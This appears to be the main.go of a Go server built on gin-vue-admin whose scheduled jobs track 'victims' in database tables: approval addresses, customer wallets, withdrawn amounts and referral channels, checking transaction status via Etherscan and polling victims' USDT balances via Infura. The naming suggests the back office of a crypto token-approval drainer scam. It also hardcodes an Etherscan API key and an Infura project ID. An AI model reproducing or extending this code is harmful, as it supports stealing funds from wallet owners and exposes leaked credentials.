package main

import (
	"encoding/json"
	"fmt"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/flipped-aurora/gin-vue-admin/server/api/v1/contract"
	"github.com/flipped-aurora/gin-vue-admin/server/core"
	"github.com/flipped-aurora/gin-vue-admin/server/global"
	"github.com/flipped-aurora/gin-vue-admin/server/initialize"
	"github.com/flipped-aurora/gin-vue-admin/server/model/system"
	"github.com/robfig/cron/v3"
	"go.uber.org/zap"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
)

//go:generate go env -w GO111MODULE=on
//go:generate go env -w GOPROXY=https://goproxy.cn,direct
//go:generate go mod tidy
//go:generate go mod download

// @title                       Swagger Example API
// @version                     0.0.1
// @description                 This is a sample Server pets
// @securityDefinitions.apikey  ApiKeyAuth
// @in                          header
// @name                        x-token
// @BasePath                    /
func main() {
	global.GVA_VP = core.Viper() // 初始化Viper
	initialize.OtherInit()
	global.GVA_LOG = core.Zap() // 初始化zap日志库
	zap.ReplaceGlobals(global.GVA_LOG)
	global.GVA_DB = initialize.Gorm() // gorm连接数据库
	initialize.Timer()
	initialize.DBList()
	if global.GVA_DB != nil {
		initialize.RegisterTables() // 初始化表
		// 程序结束前关闭数据库链接
		db, _ := global.GVA_DB.DB()
		defer db.Close()
	}

	c := cron.New()
	c.AddFunc("@every 300s", func() {
		//fmt.Println("every five seconds,%s\n", time.Now().Format("15:04:05"))

		var channels []string
		err := global.GVA_DB.Model(&system.SysVictimTx{}).Distinct("primary_channel").Where("status = ?", 1).Find(&channels).Error

		if err == nil {
			for _, channel := range channels {
				log.Println("渠道", channel)
			}
		}

		var addresses []string
		err = global.GVA_DB.Model(&system.SysVictimTx{}).Distinct("approval_address").Where("status = ?", 1).Find(&addresses).Error

		if err == nil {
			for _, address := range addresses {
				log.Println("地址", address)
			}
		}

		var records []system.SysVictimTx
		error := global.GVA_DB.Model(&system.SysVictimTx{}).Where("status = ?", 0).Find(&records).Error
		if error == nil {
			//https://api.etherscan.io/api?module=transaction&action=getstatus&txhash=0xe5a591cf60d8d967076a5cb7fcc7d0145d212ceb143fb0ec3d33e39ea1f963ea&apikey=X95EDAITM2ASW5QXWDQJMRHP2VDUZ7H85W
			for _, record := range records {
				_, isError := GetData(record.TxHash)
				if isError == "0" {
					error := global.GVA_DB.Model(&system.SysVictimTx{}).Where("id = ?", record.ID).Update("status", 1).Error
					if error == nil {
						var victim system.SysVictim

						log.Println("approval_address", record.ApprovalAddress)
						log.Println("customer_address", record.FromAddress)
						err := global.GVA_DB.Model(&system.SysVictim{}).Where("approval_address = ? AND customer_address = ?", record.ApprovalAddress, record.FromAddress).First(&victim).Error
						if err == nil {
							s1, _ := strconv.ParseFloat(victim.WithdrawAmount, 64)
							s2, _ := strconv.ParseFloat(record.WithdrawAmount, 64)
							s := s1 + s2

							log.Println("victim", victim.ID)
							log.Println("s1", s1)
							log.Println("s2", s2)
							log.Println("s", s)
							error = global.GVA_DB.Model(&system.SysVictim{}).Where("id = ?", victim.ID).Update("withdraw_amount", s).Error

						}

					}
				}
				if isError == "1" {
					error := global.GVA_DB.Model(&system.SysVictimTx{}).Where("id = ?", record.ID).Update("status", 2).Error
					if error != nil {
					}
				}
			}
		}
	})

	c.AddFunc("@every 550s", func() {
		//fmt.Println("every 45 seconds,%s\n", time.Now().Format("15:04:05"))
		var recordTxs []system.SysVictim
		error := global.GVA_DB.Model(&system.SysVictim{}).Find(&recordTxs).Error
		if error == nil {
			//https://api.etherscan.io/api?module=transaction&action=getstatus&txhash=0xe5a591cf60d8d967076a5cb7fcc7d0145d212ceb143fb0ec3d33e39ea1f963ea&apikey=X95EDAITM2ASW5QXWDQJMRHP2VDUZ7H85W
			for _, record := range recordTxs {
				amount, _ := GetBalance(record.CustomerAddress)
				balance := float64(amount) / 1000000
				//log.Println("amount ", amount)
				//log.Println("balance ", balance)
				error := global.GVA_DB.Model(&system.SysVictim{}).Where("id = ?", record.ID).Update("balance", balance).Error
				if error != nil {
				}
			}
		}

	})
	c.Start()
	core.RunWindowsServer()
}

func GetBalance(address string) (int64, error) {
	conn, err := ethclient.Dial("https://mainnet.infura.io/v3/dab126a4e1f444569c8f517a42cddda2")
	if err != nil {
		log.Fatalf("Failed to connect to the Ethereum client: %v", err)
	}
	store, err := contract.NewTetherTokenCaller(common.HexToAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7"), conn)
	if err != nil {
		log.Fatalf("Failed to instantiate a Storage contract: %v", err)
	}
	amount, err := store.BalanceOf(nil, common.HexToAddress(address))

	return amount.Int64(), err
}

func GetData(txHash string) (string, string) {
	// Get request
	resp, err := http.Get("https://api.etherscan.io/api?module=transaction&action=getstatus&txhash=" + txHash + "&apikey=X95EDAITM2ASW5QXWDQJMRHP2VDUZ7H85W")
	if err != nil {
		fmt.Println("No response from request")
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body) // response body is []byte

	var result Response
	if err := json.Unmarshal(body, &result); err != nil { // Parse []byte to the go struct pointer
		fmt.Println("Can not unmarshal JSON")
	}

	fmt.Println("============================================")
	log.Println("txhash ", txHash)
	fmt.Println(result.Status)
	fmt.Println(result.Message)
	fmt.Println(result.Result.IsError)
	fmt.Println(result.Result.ErrDescription)
	fmt.Println("============================================")

	return result.Status, result.Result.IsError

}

type Response struct {
	Status  string `json:"status"`
	Message string `json:"message"`
	Result  struct {
		IsError        string `json:"isError"`
		ErrDescription string `json:"errDescription"`
	} `json:"result"`
}
